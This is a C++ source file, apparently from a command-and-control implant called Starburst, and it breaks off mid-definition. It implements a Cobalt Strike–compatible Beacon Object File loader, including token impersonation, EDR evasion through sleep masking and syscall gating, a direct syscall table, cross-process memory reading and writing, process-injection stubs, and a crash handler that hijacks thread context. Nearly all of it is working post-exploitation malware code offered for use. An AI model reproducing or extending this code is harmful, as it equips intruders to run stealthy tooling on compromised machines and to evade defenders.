#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>
#include <coff.h>
#include <module.h>

#ifdef INCLUDE_CMD_EXECUTE_COFF

using namespace stardust;
using namespace starburst;

// ── BOF-VS Beacon API compatibility types ──
// These mirror beacon.h struct layouts for BeaconInformation / BeaconGetSyscallInformation

#define BOF_CALLBACK_OUTPUT      0x0
#define BOF_CALLBACK_ERROR       0x0d
#define BOF_MASK_SIZE            13

struct bof_heap_record {
    char*  ptr;
    size_t size;
};

struct bof_alloc_section {
    int     Label;
    PVOID   BaseAddress;
    SIZE_T  VirtualSize;
    DWORD   CurrentProtect;
    DWORD   PreviousProtect;
    BOOL    MaskSection;
    DWORD   DripLoadPageSize;
};

struct bof_alloc_cleanup {
    BOOL      Cleanup;
    int       AllocationMethod;
    uint8_t   AdditionalInfo[16];
};

struct bof_alloc_region {
    int                Purpose;
    PVOID              AllocationBase;
    SIZE_T             RegionSize;
    DWORD              Type;
    DWORD              DripLoadAllocationGranularity;
    bof_alloc_section  Sections[8];
    bof_alloc_cleanup  CleanupInformation;
};

struct bof_alloc_memory {
    bof_alloc_region AllocatedMemoryRegions[6];
};

struct bof_beacon_info {
    unsigned int       version;
    char*              sleep_mask_ptr;
    DWORD              sleep_mask_text_size;
    DWORD              sleep_mask_total_size;
    char*              beacon_ptr;
    bof_heap_record*   heap_records;
    char               mask[BOF_MASK_SIZE];
    bof_alloc_memory   allocatedMemory;
};

struct bof_syscall_entry {
    PVOID fnAddr;
    PVOID jmpAddr;
    DWORD sysnum;
};

struct bof_syscall_api {
    bof_syscall_entry ntAllocateVirtualMemory;
    bof_syscall_entry ntProtectVirtualMemory;
    bof_syscall_entry ntFreeVirtualMemory;
    bof_syscall_entry ntGetContextThread;
    bof_syscall_entry ntSetContextThread;
    bof_syscall_entry ntResumeThread;
    bof_syscall_entry ntCreateThreadEx;
    bof_syscall_entry ntOpenProcess;
    bof_syscall_entry ntOpenThread;
    bof_syscall_entry ntClose;
    bof_syscall_entry ntCreateSection;
    bof_syscall_entry ntMapViewOfSection;
    bof_syscall_entry ntUnmapViewOfSection;
    bof_syscall_entry ntQueryVirtualMemory;
    bof_syscall_entry ntDuplicateObject;
    bof_syscall_entry ntReadVirtualMemory;
    bof_syscall_entry ntWriteVirtualMemory;
    bof_syscall_entry ntReadFile;
    bof_syscall_entry ntWriteFile;
    bof_syscall_entry ntCreateFile;
    bof_syscall_entry ntQueueApcThread;
    bof_syscall_entry ntCreateProcess;
    bof_syscall_entry ntOpenProcessToken;
    bof_syscall_entry ntTestAlert;
    bof_syscall_entry ntSuspendProcess;
    bof_syscall_entry ntResumeProcess;
    bof_syscall_entry ntQuerySystemInformation;
    bof_syscall_entry ntQueryDirectoryFile;
    bof_syscall_entry ntSetInformationProcess;
    bof_syscall_entry ntSetInformationThread;
    bof_syscall_entry ntQueryInformationProcess;
    bof_syscall_entry ntQueryInformationThread;
    bof_syscall_entry ntOpenSection;
    bof_syscall_entry ntAdjustPrivilegesToken;
    bof_syscall_entry ntDeviceIoControlFile;
    bof_syscall_entry ntWaitForMultipleObjects;
};

struct bof_rtl_api {
    PVOID rtlDosPathNameToNtPathNameUWithStatusAddr;
    PVOID rtlFreeHeapAddr;
    PVOID rtlGetProcessHeapAddr;
};

struct bof_beacon_syscalls {
    bof_syscall_api syscalls;
    bof_rtl_api     rtls;
};

struct bof_data_store_object {
    int     type;
    DWORD64 hash;
    BOOL    masked;
    char*   buffer;
    size_t  length;
};

// TEB.ArbitraryUserPointer at gs:0x28
// Use raw .byte encoding for gs segment access to avoid Intel/AT&T syntax issues
static inline auto declfn coff_set_inst( instance* p ) -> void {
#ifdef _WIN64
    // mov gs:[0x28], rcx  =  65 48 89 0c 25 28 00 00 00
    register void* val __asm__("rcx") = reinterpret_cast<void*>(p);
    __asm__ volatile (
        ".byte 0x65, 0x48, 0x89, 0x0c, 0x25, 0x28, 0x00, 0x00, 0x00"
        :: "c"(val) : "memory"
    );
#endif
}

static inline auto declfn coff_get_inst() -> instance* {
#ifdef _WIN64
    // mov rax, gs:[0x28]  =  65 48 8b 04 25 28 00 00 00
    void* result;
    __asm__ volatile (
        ".byte 0x65, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00"
        : "=a"(result)
    );
    return static_cast<instance*>(result);
#else
    return nullptr;
#endif
}

// Beacon API implementations
extern "C" {

static void __cdecl declfn beacon_printf( int type, const char* fmt, ... ) {
    (void)type;
    auto inst = coff_get_inst();
    if ( !inst || !fmt ) return;

    using vsnprintf_t = int ( __cdecl* )( char*, size_t, const char*, va_list );
    auto p_vsnprintf = reinterpret_cast<vsnprintf_t>(
        resolve::_api( inst->ntdll.handle, expr::hash_string( "_vsnprintf" ) ) );

    char buf[2048];
    int len;

    if ( p_vsnprintf ) {
        va_list args;
        va_start( args, fmt );
        len = p_vsnprintf( buf, sizeof(buf) - 1, fmt, args );
        va_end( args );
        if ( len < 0 ) len = sizeof(buf) - 1;
        buf[len] = '\0';
    } else {
        len = 0;
        auto s = fmt;
        while ( *s && len < (int)sizeof(buf) - 1 ) buf[len++] = *s++;
        buf[len] = '\0';
    }

    auto& coff = inst->coff;
    if ( coff.output_length + (uint32_t)len + 2 > coff.output_capacity ) {
        uint32_t new_cap = coff.output_capacity == 0 ? 4096 : coff.output_capacity;
        while ( new_cap < coff.output_length + (uint32_t)len + 2 ) new_cap *= 2;
        coff.output_data = static_cast<char*>(
            inst->heap_realloc( coff.output_data, new_cap ) );
        coff.output_capacity = new_cap;
    }

    memory::copy( coff.output_data + coff.output_length, buf, len );
    coff.output_length += len;
    coff.output_data[coff.output_length] = '\0';
}

static void __cdecl declfn beacon_output( int type, const char* data, int len ) {
    (void)type;
    auto inst = coff_get_inst();
    if ( !inst || !data || len <= 0 ) return;

    auto& coff = inst->coff;
    if ( coff.output_length + len + 2 > coff.output_capacity ) {
        uint32_t new_cap = coff.output_capacity == 0 ? 4096 : coff.output_capacity;
        while ( new_cap < coff.output_length + (uint32_t)len + 2 ) new_cap *= 2;
        coff.output_data = static_cast<char*>(
            inst->heap_realloc( coff.output_data, new_cap ) );
        coff.output_capacity = new_cap;
    }

    memory::copy( coff.output_data + coff.output_length, const_cast<char*>(data), len );
    coff.output_length += len;
    coff.output_data[coff.output_length] = '\0';
}

struct datap {
    char*    original;
    char*    buffer;
    int      length;
    int      size;
};

static void __cdecl declfn beacon_data_parse( datap* dp, char* buf, int size ) {
    dp->original = buf;
    dp->buffer = buf;
    dp->length = size;
    dp->size = size;
}

static int __cdecl declfn beacon_data_int( datap* dp ) {
    if ( dp->length < 4 ) return 0;
    int val = *reinterpret_cast<int*>( dp->buffer );
    dp->buffer += 4;
    dp->length -= 4;
    return val;
}

static short __cdecl declfn beacon_data_short( datap* dp ) {
    if ( dp->length < 2 ) return 0;
    short val = *reinterpret_cast<short*>( dp->buffer );
    dp->buffer += 2;
    dp->length -= 2;
    return val;
}

static char* __cdecl declfn beacon_data_extract( datap* dp, int* out_len ) {
    if ( dp->length < 4 ) { if ( out_len ) *out_len = 0; return nullptr; }
    int len = *reinterpret_cast<int*>( dp->buffer );
    dp->buffer += 4;
    dp->length -= 4;
    if ( dp->length < len ) { if ( out_len ) *out_len = 0; return nullptr; }
    char* result = dp->buffer;
    dp->buffer += len;
    dp->length -= len;
    if ( out_len ) *out_len = len;
    return result;
}

static int __cdecl declfn beacon_data_length( datap* dp ) {
    return dp->length;
}

struct formatp {
    char*    original;
    char*    buffer;
    int      length;
    int      size;
};

static void __cdecl declfn beacon_format_alloc( formatp* fp, int maxsz ) {
    auto inst = coff_get_inst();
    if ( inst ) {
        fp->original = static_cast<char*>( inst->heap_alloc( maxsz ) );
        fp->buffer = fp->original;
        fp->length = 0;
        fp->size = maxsz;
    }
}

static void __cdecl declfn beacon_format_reset( formatp* fp ) {
    fp->buffer = fp->original;
    fp->length = 0;
}

static void __cdecl declfn beacon_format_free( formatp* fp ) {
    auto inst = coff_get_inst();
    if ( inst && fp->original ) {
        inst->heap_free( fp->original );
        fp->original = nullptr;
        fp->buffer = nullptr;
    }
}

static void __cdecl declfn beacon_format_append( formatp* fp, const char* buf, int len ) {
    if ( fp->length + len <= fp->size ) {
        memory::copy( fp->buffer + fp->length, const_cast<char*>(buf), len );
        fp->length += len;
    }
}

static void __cdecl declfn beacon_format_printf( formatp* fp, const char* fmt, ... ) {
    auto inst = coff_get_inst();
    if ( !inst || !fp || !fmt ) return;

    using vsnprintf_t = int ( __cdecl* )( char*, size_t, const char*, va_list );
    auto p_vsnprintf = reinterpret_cast<vsnprintf_t>(
        resolve::_api( inst->ntdll.handle, expr::hash_string( "_vsnprintf" ) ) );
    if ( !p_vsnprintf ) return;

    int avail = fp->size - fp->length;
    if ( avail <= 0 ) return;

    va_list args;
    va_start( args, fmt );
    int written = p_vsnprintf( fp->buffer + fp->length, avail, fmt, args );
    va_end( args );
    if ( written > 0 ) fp->length += written;
}

static char* __cdecl declfn beacon_format_tostring( formatp* fp, int* size ) {
    if ( size ) *size = fp->length;
    return fp->original;
}

static void __cdecl declfn beacon_format_int( formatp* fp, int val ) {
    beacon_format_append( fp, reinterpret_cast<char*>( &val ), 4 );
}

static BOOL __cdecl declfn beacon_is_admin() {
    return FALSE;
}

static DWORD __cdecl declfn beacon_get_spawn_to( BOOL x86, char* buf, int len ) {
    auto inst = coff_get_inst();
    if ( !inst || !buf || len <= 0 ) return 0;
    const char* src = x86 ? inst->spawnto.x86 : inst->spawnto.x64;
    int i = 0;
    while ( src[i] && i < len - 1 ) { buf[i] = src[i]; i++; }
    buf[i] = '\0';
    return static_cast<DWORD>( i );
}

static void __cdecl declfn beacon_cleanup_thread( void* ctx ) {
    (void)ctx;
}

// ── Data API ──

static char* __cdecl declfn beacon_data_ptr( datap* dp, int size ) {
    if ( !dp || dp->length < size ) return nullptr;
    char* result = dp->buffer;
    dp->buffer += size;
    dp->length -= size;
    return result;
}

// ── Output: file download ──

static BOOL __cdecl declfn beacon_download( const char* filename, const char* buffer, unsigned int length ) {
    auto inst = coff_get_inst();
    if ( !inst || !filename || !buffer || length == 0 ) return FALSE;
    beacon_printf( 0, "[download] %s (%u bytes received by BOF)\n", filename, length );
    return TRUE;
}

// ── Token functions ──

static BOOL __cdecl declfn beacon_use_token( HANDLE token ) {
    auto inst = coff_get_inst();
    if ( !inst || !token || token == INVALID_HANDLE_VALUE ) return FALSE;
    if ( inst->advapi32.ImpersonateLoggedOnUser( token ) ) {
        inst->agent.impersonated_token = token;
        return TRUE;
    }
    return FALSE;
}

static void __cdecl declfn beacon_revert_token() {
    auto inst = coff_get_inst();
    if ( !inst ) return;
    inst->advapi32.RevertToSelf();
    inst->agent.impersonated_token = nullptr;
}

// ── Spawn+Inject (stubs) ──

static void __cdecl declfn beacon_inject_process(
    HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len
) {
    (void)hProc; (void)pid; (void)payload; (void)p_len; (void)p_offset; (void)arg; (void)a_len;
    beacon_printf( 0, "[error] BeaconInjectProcess not yet supported\n" );
}

static void __cdecl declfn beacon_inject_temp_process(
    PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len
) {
    (void)pInfo; (void)payload; (void)p_len; (void)p_offset; (void)arg; (void)a_len;
    beacon_printf( 0, "[error] BeaconInjectTemporaryProcess not yet supported\n" );
}

static BOOL __cdecl declfn beacon_spawn_temp_process(
    BOOL x86, BOOL ignoreToken, STARTUPINFO* si, PROCESS_INFORMATION* pInfo
) {
    (void)x86; (void)ignoreToken; (void)si; (void)pInfo;
    beacon_printf( 0, "[error] BeaconSpawnTemporaryProcess not yet supported\n" );
    return FALSE;
}

// ── Utility ──

static BOOL __cdecl declfn beacon_to_wide_char( char* src, wchar_t* dst, int max ) {
    auto inst = coff_get_inst();
    if ( !inst || !src || !dst || max <= 0 ) return FALSE;
    int result = inst->kernel32.MultiByteToWideChar( 0 /*CP_ACP*/, 0, src, -1, dst, max );
    return result > 0 ? TRUE : FALSE;
}

// ── Beacon Information ──

static BOOL __cdecl declfn beacon_information( bof_beacon_info* info ) {
    auto inst = coff_get_inst();
    if ( !inst || !info ) return FALSE;

    memory::zero( info, sizeof( bof_beacon_info ) );

    info->version = 0x041200;
    info->sleep_mask_ptr = nullptr;
    info->sleep_mask_text_size = 0;
    info->sleep_mask_total_size = 0;

    if ( inst->evasion.ekko.initialized ) {
        info->beacon_ptr = reinterpret_cast<char*>( inst->evasion.ekko.img_base );
        for ( int i = 0; i < BOF_MASK_SIZE && i < 16; i++ )
            info->mask[i] = static_cast<char>( inst->evasion.ekko.rc4_key[i] );
    } else {
        info->beacon_ptr = reinterpret_cast<char*>( inst->base.address );
        ULONG seed = inst->kernel32.GetTickCount();
        for ( int i = 0; i < BOF_MASK_SIZE; i++ ) {
            seed = inst->ntdll.RtlRandomEx( &seed );
            info->mask[i] = static_cast<char>( seed & 0xFF );
        }
    }

    if ( !inst->coff.info_heap_buf ) {
        inst->coff.info_heap_buf = inst->heap_alloc( sizeof( bof_heap_record ) );
        if ( inst->coff.info_heap_buf )
            memory::zero( inst->coff.info_heap_buf, sizeof( bof_heap_record ) );
    }
    info->heap_records = reinterpret_cast<bof_heap_record*>( inst->coff.info_heap_buf );

    auto& region = info->allocatedMemory.AllocatedMemoryRegions[0];
    region.Purpose = 2; /* PURPOSE_BEACON_MEMORY */
    if ( inst->evasion.ekko.initialized ) {
        region.AllocationBase = reinterpret_cast<PVOID>( inst->evasion.ekko.img_base );
        region.RegionSize = inst->evasion.ekko.img_size;
    } else {
        region.AllocationBase = reinterpret_cast<PVOID>( inst->base.address );
        region.RegionSize = inst->base.length;
    }
    region.Type = MEM_PRIVATE;

    if ( region.AllocationBase && region.RegionSize > 0 ) {
        auto& sec = region.Sections[0];
        sec.Label = 3; /* LABEL_TEXT */
        sec.BaseAddress = region.AllocationBase;
        sec.VirtualSize = region.RegionSize;
        sec.CurrentProtect = PAGE_EXECUTE_READ;
        sec.MaskSection = TRUE;
    }

    return TRUE;
}

// ── Key/Value store ──

static uint32_t declfn _kv_hash( const char* key ) {
    uint32_t h = 0x811c9dc5;
    while ( *key ) { h ^= (uint8_t)*key++; h *= 0x01000193; }
    return h;
}

static BOOL __cdecl declfn beacon_add_value( const char* key, void* ptr ) {
    auto inst = coff_get_inst();
    if ( !inst || !key ) return FALSE;
    uint32_t h = _kv_hash( key );

    for ( uint32_t i = 0; i < inst->bof_kv.count; i++ ) {
        if ( inst->bof_kv.entries[i].hash == h ) {
            inst->bof_kv.entries[i].ptr = ptr;
            return TRUE;
        }
    }

    if ( inst->bof_kv.count >= 32 ) return FALSE;
    inst->bof_kv.entries[inst->bof_kv.count].hash = h;
    inst->bof_kv.entries[inst->bof_kv.count].ptr = ptr;
    inst->bof_kv.count++;
    return TRUE;
}

static void* __cdecl declfn beacon_get_value( const char* key ) {
    auto inst = coff_get_inst();
    if ( !inst || !key ) return nullptr;
    uint32_t h = _kv_hash( key );
    for ( uint32_t i = 0; i < inst->bof_kv.count; i++ ) {
        if ( inst->bof_kv.entries[i].hash == h )
            return inst->bof_kv.entries[i].ptr;
    }
    return nullptr;
}

static BOOL __cdecl declfn beacon_remove_value( const char* key ) {
    auto inst = coff_get_inst();
    if ( !inst || !key ) return FALSE;
    uint32_t h = _kv_hash( key );
    for ( uint32_t i = 0; i < inst->bof_kv.count; i++ ) {
        if ( inst->bof_kv.entries[i].hash == h ) {
            for ( uint32_t j = i; j + 1 < inst->bof_kv.count; j++ )
                inst->bof_kv.entries[j] = inst->bof_kv.entries[j + 1];
            inst->bof_kv.count--;
            return TRUE;
        }
    }
    return FALSE;
}

// ── Data Store (stubs — Starburst doesn't have a data store yet) ──

static bof_data_store_object* __cdecl declfn beacon_data_store_get_item( size_t ) {
    return nullptr;
}

static void __cdecl declfn beacon_data_store_protect_item( size_t ) {}
static void __cdecl declfn beacon_data_store_unprotect_item( size_t ) {}

static size_t __cdecl declfn beacon_data_store_max_entries() {
    return 0;
}

// ── Custom User Data ──

static char* __cdecl declfn beacon_get_custom_user_data() {
    auto inst = coff_get_inst();
    if ( !inst ) return nullptr;
    return reinterpret_cast<char*>( inst->evasion.udrl_user_data );
}

// ── Syscall Information ──

static BOOL __cdecl declfn beacon_get_syscall_info(
    bof_beacon_syscalls* info, SIZE_T infoSize, BOOL
) {
    auto inst = coff_get_inst();
    if ( !inst || !info || infoSize < sizeof( bof_beacon_syscalls ) ) return FALSE;

    memory::zero( info, sizeof( bof_beacon_syscalls ) );

    auto& st = inst->evasion;
    auto fill_entry = [&]( bof_syscall_entry& dst, uint32_t api_hash ) {
        for ( uint32_t i = 0; i < st.syscall_count; i++ ) {
            if ( st.syscall_table[i].hash == api_hash ) {
                dst.sysnum  = st.syscall_table[i].ssn;
                dst.jmpAddr = st.syscall_table[i].trampoline;
                dst.fnAddr  = (PVOID)resolve::_api( inst->ntdll.handle, api_hash );
                return;
            }
        }
        dst.fnAddr = (PVOID)resolve::_api( inst->ntdll.handle, api_hash );
    };

    fill_entry( info->syscalls.ntAllocateVirtualMemory,  expr::hash_string( "NtAllocateVirtualMemory" ) );
    fill_entry( info->syscalls.ntProtectVirtualMemory,   expr::hash_string( "NtProtectVirtualMemory" ) );
    fill_entry( info->syscalls.ntFreeVirtualMemory,      expr::hash_string( "NtFreeVirtualMemory" ) );
    fill_entry( info->syscalls.ntGetContextThread,       expr::hash_string( "NtGetContextThread" ) );
    fill_entry( info->syscalls.ntSetContextThread,       expr::hash_string( "NtSetContextThread" ) );
    fill_entry( info->syscalls.ntResumeThread,           expr::hash_string( "NtResumeThread" ) );
    fill_entry( info->syscalls.ntCreateThreadEx,         expr::hash_string( "NtCreateThreadEx" ) );
    fill_entry( info->syscalls.ntOpenProcess,            expr::hash_string( "NtOpenProcess" ) );
    fill_entry( info->syscalls.ntOpenThread,             expr::hash_string( "NtOpenThread" ) );
    fill_entry( info->syscalls.ntClose,                  expr::hash_string( "NtClose" ) );
    fill_entry( info->syscalls.ntCreateSection,          expr::hash_string( "NtCreateSection" ) );
    fill_entry( info->syscalls.ntMapViewOfSection,       expr::hash_string( "NtMapViewOfSection" ) );
    fill_entry( info->syscalls.ntUnmapViewOfSection,     expr::hash_string( "NtUnmapViewOfSection" ) );
    fill_entry( info->syscalls.ntQueryVirtualMemory,     expr::hash_string( "NtQueryVirtualMemory" ) );
    fill_entry( info->syscalls.ntDuplicateObject,        expr::hash_string( "NtDuplicateObject" ) );
    fill_entry( info->syscalls.ntReadVirtualMemory,      expr::hash_string( "NtReadVirtualMemory" ) );
    fill_entry( info->syscalls.ntWriteVirtualMemory,     expr::hash_string( "NtWriteVirtualMemory" ) );
    fill_entry( info->syscalls.ntQuerySystemInformation,  expr::hash_string( "NtQuerySystemInformation" ) );

    info->rtls.rtlFreeHeapAddr       = (PVOID)resolve::_api( inst->ntdll.handle, expr::hash_string( "RtlFreeHeap" ) );
    info->rtls.rtlGetProcessHeapAddr = (PVOID)resolve::_api( inst->ntdll.handle, expr::hash_string( "RtlGetProcessHeap" ) );

    return TRUE;
}

// ── System call wrapper functions (pass-through to real WinAPIs) ──

static LPVOID __cdecl declfn beacon_virtual_alloc(
    LPVOID addr, SIZE_T size, DWORD type, DWORD prot
) {
    auto inst = coff_get_inst();
    if ( !inst ) return nullptr;
    if ( inst->evasion.beacon_gate_enabled && inst->evasion.sleepmask_vs.loaded ) {
        ULONG_PTR a[4] = {
            reinterpret_cast<ULONG_PTR>( addr ), static_cast<ULONG_PTR>( size ),
            static_cast<ULONG_PTR>( type ), static_cast<ULONG_PTR>( prot )
        };
        return reinterpret_cast<LPVOID>(
            evasion_beacon_gate_call( *inst, (void*)inst->kernel32.VirtualAlloc,
                2 /*VIRTUALALLOC*/, 4, a, inst->evasion.beacon_gate_masking ) );
    }
    return inst->kernel32.VirtualAlloc( addr, size, type, prot );
}

static LPVOID __cdecl declfn beacon_virtual_alloc_ex(
    HANDLE proc, LPVOID addr, SIZE_T size, DWORD type, DWORD prot
) {
    auto inst = coff_get_inst();
    if ( !inst ) return nullptr;
    typedef LPVOID (WINAPI *fn_t)( HANDLE, LPVOID, SIZE_T, DWORD, DWORD );
    auto fn = reinterpret_cast<fn_t>(
        resolve::_api( inst->kernel32.handle, expr::hash_string( "VirtualAllocEx" ) ) );
    return fn ? fn( proc, addr, size, type, prot ) : nullptr;
}

static BOOL __cdecl declfn beacon_virtual_protect(
    LPVOID addr, SIZE_T size, DWORD prot, PDWORD old_prot
) {
    auto inst = coff_get_inst();
    if ( !inst ) return FALSE;
    if ( inst->evasion.beacon_gate_enabled && inst->evasion.sleepmask_vs.loaded ) {
        ULONG_PTR a[4] = {
            reinterpret_cast<ULONG_PTR>( addr ), static_cast<ULONG_PTR>( size ),
            static_cast<ULONG_PTR>( prot ), reinterpret_cast<ULONG_PTR>( old_prot )
        };
        return static_cast<BOOL>(
            evasion_beacon_gate_call( *inst, (void*)inst->kernel32.VirtualProtect,
                4 /*VIRTUALPROTECT*/, 4, a, inst->evasion.beacon_gate_masking ) );
    }
    return inst->kernel32.VirtualProtect( addr, size, prot, old_prot );
}

static BOOL __cdecl declfn beacon_virtual_protect_ex(
    HANDLE proc, LPVOID addr, SIZE_T size, DWORD prot, PDWORD old_prot
) {
    auto inst = coff_get_inst();
    if ( !inst ) return FALSE;
    typedef BOOL (WINAPI *fn_t)( HANDLE, LPVOID, SIZE_T, DWORD, PDWORD );
    auto fn = reinterpret_cast<fn_t>(
        resolve::_api( inst->kernel32.handle, expr::hash_string( "VirtualProtectEx" ) ) );
    return fn ? fn( proc, addr, size, prot, old_prot ) : FALSE;
}

static BOOL __cdecl declfn beacon_virtual_free(
    LPVOID addr, SIZE_T size, DWORD type
) {
    auto inst = coff_get_inst();
    if ( !inst ) return FALSE;
    if ( inst->evasion.beacon_gate_enabled && inst->evasion.sleepmask_vs.loaded ) {
        ULONG_PTR a[3] = {
            reinterpret_cast<ULONG_PTR>( addr ), static_cast<ULONG_PTR>( size ),
            static_cast<ULONG_PTR>( type )
        };
        return static_cast<BOOL>(
            evasion_beacon_gate_call( *inst, (void*)inst->kernel32.VirtualFree,
                6 /*VIRTUALFREE*/, 3, a, inst->evasion.beacon_gate_masking ) );
    }
    return inst->kernel32.VirtualFree( addr, size, type );
}

static BOOL __cdecl declfn beacon_get_thread_context( HANDLE thread, PCONTEXT ctx ) {
    auto inst = coff_get_inst();
    if ( !inst ) return FALSE;
    typedef BOOL (WINAPI *fn_t)( HANDLE, PCONTEXT );
    auto fn = reinterpret_cast<fn_t>(
        resolve::_api( inst->kernel32.handle, expr::hash_string( "GetThreadContext" ) ) );
    return fn ? fn( thread, ctx ) : FALSE;
}

static BOOL __cdecl declfn beacon_set_thread_context( HANDLE thread, PCONTEXT ctx ) {
    auto inst = coff_get_inst();
    if ( !inst ) return FALSE;
    typedef BOOL (WINAPI *fn_t)( HANDLE, PCONTEXT );
    auto fn = reinterpret_cast<fn_t>(
        resolve::_api( inst->kernel32.handle, expr::hash_string( "SetThreadContext" ) ) );
    return fn ? fn( thread, ctx ) : FALSE;
}

static DWORD __cdecl declfn beacon_resume_thread( HANDLE thread ) {
    auto inst = coff_get_inst();
    if ( !inst ) return (DWORD)-1;
    typedef DWORD (WINAPI *fn_t)( HANDLE );
    auto fn = reinterpret_cast<fn_t>(
        resolve::_api( inst->kernel32.handle, expr::hash_string( "ResumeThread" ) ) );
    return fn ? fn( thread ) : (DWORD)-1;
}

static HANDLE __cdecl declfn beacon_open_process( DWORD access, BOOL inherit, DWORD pid ) {
    auto inst = coff_get_inst();
    if ( !inst ) return nullptr;
    if ( inst->evasion.beacon_gate_enabled && inst->evasion.sleepmask_vs.loaded ) {
        ULONG_PTR a[3] = {
            static_cast<ULONG_PTR>( access ), static_cast<ULONG_PTR>( inherit ),
            static_cast<ULONG_PTR>( pid )
        };
        return reinterpret_cast<HANDLE>(
            evasion_beacon_gate_call( *inst, (void*)inst->kernel32.OpenProcess,
                12 /*OPENPROCESS*/, 3, a, inst->evasion.beacon_gate_masking ) );
    }
    return inst->kernel32.OpenProcess( access, inherit, pid );
}

static HANDLE __cdecl declfn beacon_open_thread( DWORD access, BOOL inherit, DWORD tid ) {
    auto inst = coff_get_inst();
    if ( !inst ) return nullptr;
    typedef HANDLE (WINAPI *fn_t)( DWORD, BOOL, DWORD );
    auto fn = reinterpret_cast<fn_t>(
        resolve::_api( inst->kernel32.handle, expr::hash_string( "OpenThread" ) ) );
    return fn ? fn( access, inherit, tid ) : nullptr;
}

static BOOL __cdecl declfn beacon_close_handle( HANDLE h ) {
    auto inst = coff_get_inst();
    if ( !inst ) return FALSE;
    if ( inst->evasion.beacon_gate_enabled && inst->evasion.sleepmask_vs.loaded ) {
        ULONG_PTR a[1] = { reinterpret_cast<ULONG_PTR>( h ) };
        return static_cast<BOOL>(
            evasion_beacon_gate_call( *inst, (void*)inst->kernel32.CloseHandle,
                14 /*CLOSEHANDLE*/, 1, a, inst->evasion.beacon_gate_masking ) );
    }
    return inst->kernel32.CloseHandle( h );
}

static BOOL __cdecl declfn beacon_unmap_view_of_file( LPCVOID addr ) {
    auto inst = coff_get_inst();
    if ( !inst ) return FALSE;
    typedef BOOL (WINAPI *fn_t)( LPCVOID );
    auto fn = reinterpret_cast<fn_t>(
        resolve::_api( inst->kernel32.handle, expr::hash_string( "UnmapViewOfFile" ) ) );
    return fn ? fn( addr ) : FALSE;
}

static SIZE_T __cdecl declfn beacon_virtual_query(
    LPCVOID addr, PMEMORY_BASIC_INFORMATION mbi, SIZE_T len
) {
    auto inst = coff_get_inst();
    if ( !inst ) return 0;
    typedef SIZE_T (WINAPI *fn_t)( LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T );
    auto fn = reinterpret_cast<fn_t>(
        resolve::_api( inst->kernel32.handle, expr::hash_string( "VirtualQuery" ) ) );
    return fn ? fn( addr, mbi, len ) : 0;
}

static BOOL __cdecl declfn beacon_duplicate_handle(
    HANDLE src_proc, HANDLE src_handle, HANDLE dst_proc, LPHANDLE dst_handle,
    DWORD access, BOOL inherit, DWORD opts
) {
    auto inst = coff_get_inst();
    if ( !inst ) return FALSE;
    typedef BOOL (WINAPI *fn_t)( HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD );
    auto fn = reinterpret_cast<fn_t>(
        resolve::_api( inst->kernel32.handle, expr::hash_string( "DuplicateHandle" ) ) );
    return fn ? fn( src_proc, src_handle, dst_proc, dst_handle, access, inherit, opts ) : FALSE;
}

static BOOL __cdecl declfn beacon_read_process_memory(
    HANDLE proc, LPCVOID addr, LPVOID buf, SIZE_T size, SIZE_T* bytes_read
) {
    auto inst = coff_get_inst();
    if ( !inst ) return FALSE;
    typedef BOOL (WINAPI *fn_t)( HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T* );
    auto fn = reinterpret_cast<fn_t>(
        resolve::_api( inst->kernel32.handle, expr::hash_string( "ReadProcessMemory" ) ) );
    return fn ? fn( proc, addr, buf, size, bytes_read ) : FALSE;
}

static BOOL __cdecl declfn beacon_write_process_memory(
    HANDLE proc, LPVOID addr, LPCVOID buf, SIZE_T size, SIZE_T* bytes_written
) {
    auto inst = coff_get_inst();
    if ( !inst ) return FALSE;
    typedef BOOL (WINAPI *fn_t)( HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T* );
    auto fn = reinterpret_cast<fn_t>(
        resolve::_api( inst->kernel32.handle, expr::hash_string( "WriteProcessMemory" ) ) );
    return fn ? fn( proc, addr, buf, size, bytes_written ) : FALSE;
}

// ── BeaconGate toggles (stored in instance for future sleepmask-vs integration) ──

static void __cdecl declfn beacon_disable_gate() {
    auto inst = coff_get_inst();
    if ( inst ) inst->evasion.beacon_gate_enabled = false;
}

static void __cdecl declfn beacon_enable_gate() {
    auto inst = coff_get_inst();
    if ( inst ) inst->evasion.beacon_gate_enabled = true;
}

static void __cdecl declfn beacon_disable_gate_masking() {
    auto inst = coff_get_inst();
    if ( inst ) inst->evasion.beacon_gate_masking = false;
}

static void __cdecl declfn beacon_enable_gate_masking() {
    auto inst = coff_get_inst();
    if ( inst ) inst->evasion.beacon_gate_masking = true;
}

} // extern "C"

// read current thread ID from TEB
static inline auto declfn get_current_tid() -> uint32_t {
#ifdef _WIN64
    uint32_t tid;
    __asm__ volatile (
        ".byte 0x65, 0x8b, 0x04, 0x25, 0x48, 0x00, 0x00, 0x00"
        : "=a"(tid)
    );
    return tid;
#else
    uint32_t tid;
    __asm__ volatile (
        ".byte 0x64, 0x8b, 0x04, 0x25, 0x24, 0x00, 0x00, 0x00"
        : "=a"(tid)
    );
    return tid;
#endif
}

static auto WINAPI declfn bof_crash_handler(
    EXCEPTION_POINTERS* ep ) -> LONG
{
    auto inst = coff_get_inst();
    if ( !inst || !inst->coff.guard_active )
        return EXCEPTION_CONTINUE_SEARCH;

    if ( get_current_tid() != inst->coff.bof_thread_id )
        return EXCEPTION_CONTINUE_SEARCH;

    inst->coff.crash_code = ep->ExceptionRecord->ExceptionCode;
    inst->coff.guard_active = 0;

#ifdef _WIN64
    ep->ContextRecord->Rcx = ep->ExceptionRecord->ExceptionCode;
    ep->ContextRecord->Rip = inst->coff.exit_thread_addr;
    ep->ContextRecord->Rsp &= ~0xFull;
    ep->ContextRecord->Rsp -= 8;
#else
    ep->ContextRecord->Esp -= 4;
    *reinterpret_cast<uint32_t*>( ep->ContextRecord->Esp ) =
        ep->ExceptionRecord->ExceptionCode;
    ep->ContextRecord->Eip = static_cast<uint32_t>( inst->coff.exit_thread_addr );
#endif

    return EXCEPTION_CONTINUE_EXECUTION;
}

struct bof_run_ctx {
    void*     entry;
    char*     args;
